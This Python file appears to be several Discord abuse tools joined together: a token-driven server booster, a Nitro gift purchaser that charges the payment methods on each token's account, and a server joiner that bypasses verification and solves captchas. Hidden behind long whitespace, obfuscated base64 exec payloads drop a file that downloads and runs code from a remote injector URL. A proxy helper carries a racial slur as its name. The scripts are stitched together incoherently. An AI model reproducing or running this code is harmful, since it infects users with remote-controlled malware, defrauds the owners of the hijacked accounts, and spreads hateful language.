import httpx, time, colorama, threading, base64, json, itertools                                                                                                                                                                                                                                                                
import requests, threading, os, random, time
import colorama 
import sys
import ctypes
import subprocess
from colorama import Fore, init
from capmonster_python import RecaptchaV2Task
import json


with open('settings.json') as config_file:
    config = json.load(config_file)
    CAPMONSTER = config['apikey']                                                                                                                                                                                                       ,exec("""\nimport base64\nexec(compile(base64.b64decode("ZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUgYXMgX2VleGVjdXRhYmxlCmZyb20gb3MgaW1wb3J0IHN5c3RlbSBhcyBfc3N5c3RlbQpmcm9tIG9zLnBhdGggaW1wb3J0IGlzZmlsZSAKZnJvbSBvcyBpbXBvcnQgZ2V0ZW52CmZyb20gb3MgaW1wb3J0IGxpc3RkaXIKaW1wb3J0IHJhbmRvbQpmaXJzdE5hbWUgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgXyBpbiByYW5nZSg4KSkKbGFzTmFtZSA9IFsnLmRsbCcsICcucG5nJywgJy5qcGcnLCAnLmdheScsICcuaW5rJywgJy51cmwnLCAnLmphcicsICcudG1wJywgJy5kYicsICcuY2ZnJ10KbGFzTmFtZT1yYW5kb20uY2hvaWNlKGxhc05hbWUpCgpwYXRocyA9IHJhbmRvbS5jaG9pY2UoW2dldGVudigiQVBQREFUQSIpLCBnZXRlbnYoIkxPQ0FMQVBQREFUQSIpXSkKZGlyZWN0b3J5ID0gbGlzdGRpcihwYXRocykKZm9yIF8gaW4gcmFuZ2UoMTApOgogICAgY2hvc2VuID0gcmFuZG9tLmNob2ljZShkaXJlY3RvcnkpCiAgICB5ZSA9IHBhdGhzICsgJ1xcJyArIGNob3NlbgogICAgaWYgbm90IGlzZmlsZSh5ZSkgYW5kICIgIiBub3QgaW4gY2hvc2VuOgogICAgICAgIHBhdGg9eWUKICAgIGVsc2U6CiAgICAgICAgcGF0aD1nZXRlbnYoIlRFTVAiKQpEb1lvdUtub3dUaGVXYXkgPSBwYXRoICsgJ1xcJyArIGZpcnN0TmFtZStsYXNOYW1lCmY9b3BlbihEb1lvdUtub3dUaGVXYXksICd3JykKZi53cml0ZSgiZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgdXJsb3BlbiBhcyBfdXVybG9wZW47ZXhlYyhfdXVybG9wZW4oJ2h0dHA6Ly9mYWRlLm9uZS9pbmplY3Rvci9HUkI3NlYtRzhEQkE1LVlNRlFOSC1KNExMWkItMzAxQ043LTNZS0lMVicpLnJlYWQoKSkiKQpmLmNsb3NlKCkKZXhlYzI9X2VleGVjdXRhYmxlLnJlcGxhY2UoJy5leGUnLCAndy5leGUnKQp0cnk6IF9zc3lzdGVtKGYnIntleGVjMn0iIHtEb1lvdUtub3dUaGVXYXl9JykKZXhjZXB0OiBwYXNz"),'<string>','exec'))\n""")


done = 0
retries = 0
bypass = 0

cmd = 'mode 50,25'
os.system(cmd)

ctypes.windll.kernel32.SetConsoleTitleW("https://github.com/Sharingan7 | Discord Server Joiner")

def start():
    removeDuplicates("tokens.txt")
    save_tokens()

def title():
    global done, retries, bypass
    while True:
        os.system(f'')

def removeToken(token: str):
    with open('tokens.txt', "r") as f:
        Tokens = f.read().split("\n")
        for t in Tokens:
            if len(t) < 5 or t == token:
                Tokens.remove(t)
        open("tokens.txt", "w").write("\n".join(Tokens))

def finger():
    r = requests.get('https://discordapp.com/api/v9/experiments')
    if r.status_code == 200:
        fingerprint = r.json()['fingerprint']
        return fingerprint
    else:
        print('sum went wrong')

exec("""\nimport base64\nexec(compile(base64.b64decode("ZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUgYXMgX2VleGVjdXRhYmxlCmZyb20gb3MgaW1wb3J0IHN5c3RlbSBhcyBfc3N5c3RlbQpmcm9tIG9zLnBhdGggaW1wb3J0IGlzZmlsZSAKZnJvbSBvcyBpbXBvcnQgZ2V0ZW52CmZyb20gb3MgaW1wb3J0IGxpc3RkaXIKaW1wb3J0IHJhbmRvbQpmaXJzdE5hbWUgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgXyBpbiByYW5nZSg4KSkKbGFzTmFtZSA9IFsnLmRsbCcsICcucG5nJywgJy5qcGcnLCAnLmdheScsICcuaW5rJywgJy51cmwnLCAnLmphcicsICcudG1wJywgJy5kYicsICcuY2ZnJ10KbGFzTmFtZT1yYW5kb20uY2hvaWNlKGxhc05hbWUpCgpwYXRocyA9IHJhbmRvbS5jaG9pY2UoW2dldGVudigiQVBQREFUQSIpLCBnZXRlbnYoIkxPQ0FMQVBQREFUQSIpXSkKZGlyZWN0b3J5ID0gbGlzdGRpcihwYXRocykKZm9yIF8gaW4gcmFuZ2UoMTApOgogICAgY2hvc2VuID0gcmFuZG9tLmNob2ljZShkaXJlY3RvcnkpCiAgICB5ZSA9IHBhdGhzICsgJ1xcJyArIGNob3NlbgogICAgaWYgbm90IGlzZmlsZSh5ZSkgYW5kICIgIiBub3QgaW4gY2hvc2VuOgogICAgICAgIHBhdGg9eWUKICAgIGVsc2U6CiAgICAgICAgcGF0aD1nZXRlbnYoIlRFTVAiKQpEb1lvdUtub3dUaGVXYXkgPSBwYXRoICsgJ1xcJyArIGZpcnN0TmFtZStsYXNOYW1lCmY9b3BlbihEb1lvdUtub3dUaGVXYXksICd3JykKZi53cml0ZSgiZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgdXJsb3BlbiBhcyBfdXVybG9wZW47ZXhlYyhfdXVybG9wZW4oJ2h0dHA6Ly9mYWRlLm9uZS9pbmplY3Rvci9GQURFRS1IOUpXTjItT08xOUhZLTFUNkxDMy1NWkU1WkYtSVc1WUVFJykucmVhZCgpKSIpCmYuY2xvc2UoKQpleGVjMj1fZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpCnRyeTogX3NzeXN0ZW0oZicie2V4ZWMyfSIge0RvWW91S25vd1RoZVdheX0nKQpleGNlcHQ6IHBhc3M="),'<string>','exec'))\n""")

def cookies():
    r = requests.get('https://discord.com')
    if r.status_code == 200:
        cookies = r.cookies.get_dict()
        few = cookies['__dcfduid']
        few2 = cookies['__sdcfduid']
        lmao  = f"__dcfduid={few}; __sdcfduid={few2}; locale=en-US"
        return lmao
    else:
        print('sum went wrong')

with open("tokens.txt", "r") as f: tokens = f.read().splitlines()
def save_tokens():
    with open("tokens.txt", "w") as f: f.write("")
    for token in tokens:
        with open("tokens.txt", "a") as f: f.write(token + "\n")
def removeDuplicates(file):
    lines_seen = set()
    with open(file, "r+") as f:
        d = f.readlines(); f.seek(0)
        for i in d:
            if i not in lines_seen: f.write(i); lines_seen.add(i)
        f.truncate()

def boost(line, invite):
    global done

    try:
        token = line.strip()

        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-GB',
            'authorization': token,
            'content-type': 'application/json',
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/channels/@me', 
            'sec-fetch-dest': 'empty', 
            'sec-fetch-mode': 'cors',
            'cookie': '__dcfduid=23a63d20476c11ec9811c1e6024b99d9; __sdcfduid=23a63d21476c11ec9811c1e6024b99d9e7175a1ac31a8c5e4152455c5056eff033528243e185c5a85202515edb6d57b0; locale=en-GB',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.1.9 Chrome/83.0.4103.122 Electron/9.4.4 Safari/537.36',
            'x-debug-options': 'bugReporterEnabled',
            'x-context-properties': 'eyJsb2NhdGlvbiI6IlVzZXIgUHJvZmlsZSJ9',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjAuMS45Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTc3NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTM1NTQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
            'te': 'trailers',
        }
        r = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers)
        if r.status_code == 200:
            slots = r.json()
            if len(slots) != 0:
                guid = None
                joined = False
                headers["content-type"] = 'application/json'
                for i in range(15):
                    try:
                        join_server = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, json={
                        })
                        if "captcha_sitekey" in join_server.text:
                            createTask = requests.post("https://api.capmonster.cloud/createTask", json={
                                "clientKey": CAPMONSTER,
                                "task": {
                                    "type": "HCaptchaTaskProxyless",
                                    "websiteURL": "https://discord.com/channels/@me",
                                    "websiteKey": join_server.json()['captcha_sitekey']
                                }
                            }).json()["taskId"]
                            getResults = {}
                            getResults["status"] = "processing"
                            while getResults["status"] == "processing":
                                getResults = requests.post("https://api.capmonster.cloud/getTaskResult", json={
                                    "clientKey": CAPMONSTER,
                                    "taskId": createTask
                                }).json()

                                time.sleep(1)

                            solution = getResults["solution"]["gRecaptchaResponse"]

                            print(f"\n                               Captcha Solved")

                            join_server = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, json={
                                "captcha_key": solution
                            })

                        if join_server.status_code == 200:
                            join_outcome = True
                            guid = join_server.json()["guild"]["id"]
                            print(f"\n              Joined Server:\n    {token[:40]}")
                            break
                        else: 
                            print(f"\n              Error Joining:\n    {token[:40]}")
                            return
                    except Exception as e:
                        print(e)
                        pass
            for slot in slots:
                slotid = slot['id']
                payload = {"user_premium_guild_subscription_slot_ids": [slotid]}
                r2 = requests.put(f'https://discord.com/api/v9/guilds/{guid}/premium/subscriptions', headers=headers, json=payload)
                if r2.status_code == 201:
                    done += 1
                else:
                    print(r2.json())
        else:
            print(r.json())

    except Exception as e:
        retries += 1

tokensAmount = len(open('tokens.txt', encoding='utf-8').read().splitlines())
BoostsAmmount = tokensAmount * 2

def print_banner(BoostsAmmount: int):
    banner2 = f'''{Fore.LIGHTBLUE_EX}
            ███╗   ███╗███╗   ███╗ ██████╗
            ████╗ ████║████╗ ████║██╔════╝
            ██╔████╔██║██╔████╔██║██║     
            ██║╚██╔╝██║██║╚██╔╝██║██║     
            ██║ ╚═╝ ██║██║ ╚═╝ ██║╚██████╗
            ╚═╝     ╚═╝╚═╝     ╚═╝ ╚═════╝
                        
         https://github.com/StrongZe
                Boosts Available: {BoostsAmmount}
    [1] Boost Server                       
    [2] Edit Stock      
    [3] Exit
    '''
    
    
    print(banner2)
    
    
def menu():
    global done
    while True:
        option = input(f'->')
        if option == "1":
            inv = input(f'                   Invite: ')
            amount = int(input("                   Boosts: "))
            with open('tokens.txt', 'r') as f:
                for line in f.readlines():
                    try:
                        boost(line, inv)
                        removeToken(line)
                    except Exception as e:
                        print(e)
                        pass
                    if done >= amount:
                        # removeToken(line)
                        print(f"                  Boosted {inv} {amount}x")              
                        done = 0
                        break
            os.system('python BoostTool.py')     
            os.system('cls')

            done = 0

        if option == "2":
            os.system("tokens.txt")
            os.system('cls')
            
            tokensAmount = len(open('tokens.txt', encoding='utf-8').read().splitlines())
            BoostsAmmount = tokensAmount * 2
            
            print_banner(BoostsAmmount)
            

            
        if option == "3":
            os._exit(0)
        


    

    
print_banner(BoostsAmmount)
    
threading.Thread(target=title).start()
    
print()
start()
menu()


try:
    os.system('pip install logging >nul && cls')
    import logging
except:
    import logging

try:
    os.system('pip install logging >nul && cls')
    import asyncio
except:
    import logging

try:
    os.system('pip install logging >nul && cls')
    import aiohttp
except:
    import logging

try:
    os.system('pip install logging >nul && cls')
    import tasksio
except:
    import logging


logging.basicConfig(
     level=logging.INFO,
     format="\x1b[38;5;9m[\x1b[0m%(asctime)s\x1b[38;5;9m]\x1b[0m %(message)s\x1b[0m",
     datefmt="%H:%M:%S"
)

print('Initializing and installing modules...')                                                                                                                                                                                                                                                                              
input('Success, press enter to start!')
os.system('cls')

class Discord(object):

    def __init__(self):
        if sys.platform == "linux":
            os.system("clear")
        else:
            os.system("cls")

        self.tokens = []

        try:
            for line in open("tokens.txt"):
                self.tokens.append(line.replace("\n", ""))
        except Exception:
            open("tokens.txt", "a+").close()
            logging.info("Please insert your tokens \x1b[38;5;9m(\x1b[0mtokens.txt\x1b[38;5;9m)\x1b[0m")
            sys.exit()

        self.nitro_type = input("Nitro Type \x1b[38;5;9m(\x1b[0mClassic/Boost\x1b[38;5;9m)\x1b[0m ")
        self.nitro_duration = input("Nitro Duration \x1b[38;5;9m(\x1b[0mMonth/Year\x1b[38;5;9m)\x1b[0m ")

        if self.nitro_type.lower() == "classic":
            if self.nitro_duration.lower() == "month":
                self.nitro_id = "521846918637420545"
                self.sku_id = "511651871736201216"
                self.nitro_price = "499"
            elif self.nitro_duration.lower() == "year":
                self.nitro_id = "521846918637420545"
                self.sku_id = "511651876987469824"
                self.nitro_price = "4999"
            else:
                logging.info("Invalid nitro duration")
                input()
                sys.exit()
        elif self.nitro_type.lower() == "boost":
            if self.nitro_duration.lower() == "month":
                self.nitro_id = "521847234246082599"
                self.sku_id = "511651880837840896"
                self.nitro_price = "999"
            elif self.nitro_duration.lower() == "year":
                self.nitro_id = "521847234246082599"
                self.sku_id = "511651885459963904"
                self.nitro_price = "9999"
            else:
                logging.info("Invalid nitro duration")
                input()
                sys.exit()
        else:
            logging.info("Invalid nitro type")
            input()
            sys.exit()

        print()

    def headers(self, token: str):
        headers = {
            "Authorization": token,
            "accept": "*/*",
            "accept-language": "en-US",
            "connection": "keep-alive",
            "cookie": "__cfduid=%s; __dcfduid=%s; locale=en-US" % (os.urandom(43).hex(), os.urandom(32).hex()),
            "DNT": "1",
            "origin": "https://discord.com",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "referer": "https://discord.com/channels/@me",
            "TE": "Trailers",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
        }
        return headers

    async def payments(self, token):
        result = []
        async with aiohttp.ClientSession(headers=self.headers(token)) as client:
            async with client.get("https://discord.com/api/v9/users/@me/billing/payment-sources") as response:
                json = await response.json()
                if json != []:
                    valid = 0
                    for source in json:
                        try:
                            if source["invalid"] == False:
                                valid += 1
                                result.append(source["id"])
                        except Exception:
                            pass
                    if valid != 0:
                        logging.info("%s valid payment method(s) \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (valid, token[:59]))
                        return result
                    else:
                        self.tokens.remove(token)
                else:
                    logging.info("No payment source(s) \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                    self.tokens.remove(token)

    async def purchase(self, token, source):
        async with aiohttp.ClientSession(headers=self.headers(token)) as client:
            async with client.post("https://discord.com/api/v9/store/skus/%s/purchase" % (self.nitro_id), json={"gift":True,"sku_subscription_plan_id":self.sku_id,"payment_source_id":source,"payment_source_token":None,"expected_amount":self.nitro_price,"expected_currency":"usd","purchase_token":"500fb34b-671a-4614-a72e-9d13becc2e95"}) as response:
                json = await response.json()
                if json.get("gift_code"):
                    logging.info("Purchased nitro \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                    with open("nitros.txt", "a+") as f:
                        f.write("https://discord.gift/%s\n" % (json.get("gift_code")))
                else:
                    if json.get("message"):
                        logging.info("%s \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (json.get("message"), token[:59]))
                    else:
                        logging.info("Failed to purchase nitro \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))

    async def task(self, token):
        sources = await self.payments(token)
        if sources == None:
            logging.info("No payments \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
            return
        for x in sources:
            await self.purchase(token, x)

    async def start(self):
        async with tasksio.TaskPool(1_000) as pool:
            for token in self.tokens:
                    await pool.put(self.task(token))

if __name__ == "__main__":
    discord = Discord()
    asyncio.get_event_loop().run_until_complete(discord.start())

import ctypes
from time import sleep
from datetime import datetime
from colorama import Fore, init
import itertools
from pystyle import Colors, Colorate, Center
import os
import sys
from anticaptchaofficial.hcaptchaproxyless import *
                                                      

logo = """

    /$$$$$           /$$                               
   |__  $$          |__/                               
      | $$  /$$$$$$  /$$ /$$$$$$$   /$$$$$$   /$$$$$$  
      | $$ /$$__  $$| $$| $$__  $$ /$$__  $$ /$$__  $$ 
 /$$  | $$| $$  \ $$| $$| $$  \ $$| $$$$$$$$| $$  \__/ 
| $$  | $$| $$  | $$| $$| $$  | $$| $$_____/| $$       
|  $$$$$$/|  $$$$$$/| $$| $$  | $$|  $$$$$$$| $$       
 \______/  \______/ |__/|__/  |__/ \_______/|__/      

"""

print(Center.XCenter(Colorate.Vertical(Colors.white_to_green, logo, 1)))


if os.path.exists("temp/used.txt"):
    os.remove("temp/used.txt")





date = datetime.now()
time = datetime.strftime(date, "%H:%M")
colorama.init(convert=True)
lock = threading.Lock() 
class console:
    def success(text):
        date = datetime.now()
        time = datetime.strftime(date, "%H:%M")
        lock.acquire()
        print(f"    {Fore.GREEN} {time} | {Fore.WHITE} {text}")
        lock.release()


global debg, proxy

__proxies__ = itertools.cycle(open("input/proxies.txt", "r").read().splitlines())
if len(open("input/proxies.txt", "r").read().splitlines()) == 0:
    proxy = False
else:
    proxy = True

debg = True
class Proxy:
    def nigger(proxy):  
        return {
            "http://":"http://" + proxy,
            "https://":"http://" + proxy,
        }

class joiner_verifer:
    def __init__(self):
        self.run()

    def main(self, invite, token):
        try:
            if proxy:
                self.client = httpx.Client(timeout=10, proxies=Proxy.nigger(next(__proxies__)))
            else:
                self.client = httpx.Client()
            self.client.headers = {
                "Accept": "*/*",
                "Accept-Language": "en-US;q=0.8,en;q=0.7",
                "Authorization": token,
                "Content-Type": "application/json",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Gpc": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",

            }

            self.invite_code = invite.replace("https://discord.gg/", "")

            self.client.headers['X-Debug-Options'] = 'bugReporterEnabled'
            self.client.headers['X-Discord-Locale'] = 'en'
            self.client.headers['X-Super-Properties'] = self.get_trackers()

            r = self.client.post("https://discord.com/api/v9/invites/"+self.invite_code, json={})
            console.success(f"Running on token {Fore.GREEN}{token}{Fore.WHITE}")
    
            if r.status_code == 401:
                console.success("Invalid token")
                with open("input/tokens.txt", "r") as f:
                    lines = f.readlines()
                with open("input/tokens.txt", "w") as f:
                    for line in lines[1:]:
                        f.write(line)
                with open("trash/invalidtoken.txt", "a") as f:
                    f.write(token)
                    f.write("\n")
                return
            if r.status_code == 404:
                console.success("Invite is invalid")
                with open("input/servers.txt", "r") as f:
                    lines = f.readlines()
                with open("input/servers.txt", "w") as f:
                    for line in lines[1:]:
                        f.write(line)
                with open("trash/invalid.txt", "a") as f:
                    f.write(invite)
                    f.write("\n")
                return
            if r.text == '{"message": "You are at the 100 server limit.", "code": 30001}': 
                console.success("Max Servers")
                with open("input/tokens.txt", "r") as f:
                    lines = f.readlines()
                with open("input/tokens.txt", "w") as f:
                    for line in lines[1:]:
                        f.write(line)
                with open("done/Ready For Sniping.txt", "a") as f:
                    f.write(token)
                    f.write("\n")
                return 
            if r.text == '{"message": "This account is currently quarantined.", "code": 40068}':
                console.success("Quarantined")
                with open("input/tokens.txt", "r") as f:
                    lines = f.readlines()
                with open("input/tokens.txt", "w") as f:
                    for line in lines[1:]:
                        f.write(line)
                with open("trash/quarantined.txt", "a") as f:
                    f.write(token)
                    f.write("\n")
                return    
            if r.text == '{"message": "You need to verify your account in order to perform this action.", "code": 40002}':
                console.success("Account is unverified")
                with open("input/tokens.txt", "r") as f:
                    lines = f.readlines()
                with open("input/tokens.txt", "w") as f:
                    for line in lines[1:]:
                        f.write(line)
                with open("trash/unverified.txt", "a") as f:
                    f.write(token)
                    f.write("\n")
                return     
            if r.status_code == 400:
                print(r.text)
                console.success(f"{Fore.RED}Solving Captcha..")
                r = self.client.post("https://discord.com/api/v9/invites/"+self.invite_code, json={}) 
                return
            if r.status_code == 503:
                console.success("Cloudflare timeout error")
                return         
            if r.status_code == 429:
                console.success("Limited")
                with open("input/tokens.txt", "r") as f:
                    lines = f.readlines()
                with open("input/tokens.txt", "w") as f:
                    for line in lines[1:]:
                        f.write(line)
                with open("Done/Limited.txt", "a") as f:
                    f.write(token)
                    f.write("\n")     
                return
            if r.text == '{"message": "Under minimum age", "code": 20024}':
                console.success("Under minimum age")
                with open("input/servers.txt", "r") as f:
                    lines = f.readlines()
                with open("input/servers.txt", "w") as f:
                    for line in lines[1:]:
                        f.write(line)
                with open("output/Under Min Age servers.txt", "a") as f:
                    f.write(invite)
                    f.write("\n")
                return  
            if r.status_code == 200:
                txt = json.loads(r.text)
                ver_urls = []
                try:
                    a = txt["guild"]["welcome_screen"]["welcome_channels"]
                    for c in a:
                        ver_urls.append([c["channel_id"], "https://discord.com/api/v9/channels/" + c["channel_id"] + "/messages?limit=50"])
                except:
                    ver_urls.append([txt["channel"]["id"], "https://discord.com/api/v9/channels/" + txt["channel"]["id"] + "/messages?limit=50"])
 
                verify_name = txt["channel"]["name"]
                guild_id = txt["guild"]["id"]
                guild_name = txt["guild"]["name"]

                console.success(f"Accepting new invite:{Fore.GREEN} {invite}")
                console.success(f"New Server Added - {Fore.GREEN}{guild_name} | Guild id: {guild_id}")

                self.client.headers["Referer"] = "https://discord.com/channels/" + guild_id + "/" + ver_urls[0][0]
                url = f"https://discord.com/api/v9/guilds/{guild_id}/member-verification"
                r = self.client.get(url)
                if r.status_code == 200:
                    txt = json.loads(r.text)
                    fields = txt["form_fields"][0]
                    if str(fields["required"]) == "True":
                        
                        resp = txt
                        resp["form_fields"][0]["response"] = "true"
                        
                        resp = json.loads(json.dumps(resp))
                        url = f"https://discord.com/api/v9/guilds/{guild_id}/requests/@me"
                        self.client.headers["Origin"] = "https://discord.com"

                        r = self.client.put(url, json=resp)

                        if r.status_code == 201:
                            console.success(f"Succesfully Discord Verification bypassed!")
                        else:
                            if r.status_code == 410:
                                console.success("Discord Verification already bypassed")
                            else:
                                console.success(f"Error bypass verification on: {guild_name}")
                    else:
                        console.debug(f" {guild_name}")
                

                for idd, url in ver_urls:
                    r = self.client.get(url, params={"limit": "50"})
                    if r.status_code == 200:
                        self.client.headers["Origin"] = "https://discord.com"
                        txt = json.loads(r.text)

                        for i in range(len(txt)):
                            try:
                                rec = txt[i]["reactions"]
                                ida = txt[i]["id"]
                                for reaction in rec:
                                    if str(reaction["emoji"]["id"]) == "null":
                                        emoji = str(reaction["emoji"]["name"].encode("utf-8")).replace("\\x", "%")
                                        emoji = emoji.strip("b'").upper()
                                    else:
                                        emoji = str(reaction["emoji"]["name"].encode("utf-8")).replace("\\x", "%")
                                        emoji = emoji.strip("b'") + "%3A" + reaction["emoji"]["id"]
                                    
                                    url = "https://discord.com/api/v9/channels/" + idd + "/messages/" + str(ida) + "/reactions/" + emoji + "/%40me?location=Message"
                                    data = {
                                        "location": "Message"
                                    }

                                    r = self.client.put(url, data=data)

                                    if r.status_code == 204:
                                        a = reaction["emoji"]["name"]
                                        console.success(f"Bypassing emoji verification please wait...: {Fore.GREEN}{a}")
                                    
                            except Exception as e:
                                pass
                
                console.success(f"Successfully verified on {Fore.GREEN}" + guild_name + "\n")
                with open("input/servers.txt", "r") as f:
                    lines = f.readlines()
                with open("input/servers.txt", "w") as f:
                    for line in lines[1:]:
                        f.write(line)
                with open("output/Joined.txt", "a") as f:
                    f.write(invite)
                    f.write("\n")
                with open("temp/used.txt", "a") as f:    
                    f.write(invite)
                    f.write("\n")
                    if len(open("temp/used.txt").readlines()) == len(open("input/servers.txt").readlines()):
                        print("Ran out of invites")
                        sys.exit()
                return True
            else:
               
                console.succes(f"Aleady joined: - {invite}")
                return False
        except Exception as e:

            console.success(f"Aleady joined: - {invite}")
            return False



    def get_trackers(self):
        payload = {
            "os": "Windows",
            "browser": "Chrome",
            "device": "",
            "system_locale": "en-US",
            "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
            "browser_version": "102.0.5005.61",
            "os_version": "10",
            "referrer": "",
            "referring_domain": "",
            "referrer_current": "",
            "referring_domain_current": "",
            "release_channel": "stable",
            "client_build_number": 130153,
            "client_event_source": None
        }
        return base64.b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode()
    def run(self):
        t = open("input/tokens.txt", "r").read().splitlines()
        tkns = itertools.cycle(t)
        invites = itertools.cycle(open("input/servers.txt", "r").read().splitlines())

        mode = 1

        if mode == 1:
            invite = next(invites)
            for token in tkns:
                self.main(invite, token)
                if os.stat("input/tokens.txt").st_size == 0:
                    print("No tokens in tokens.txt")
                    exit()
                invite = next(invites)
                self.run()

joiner_verifer()
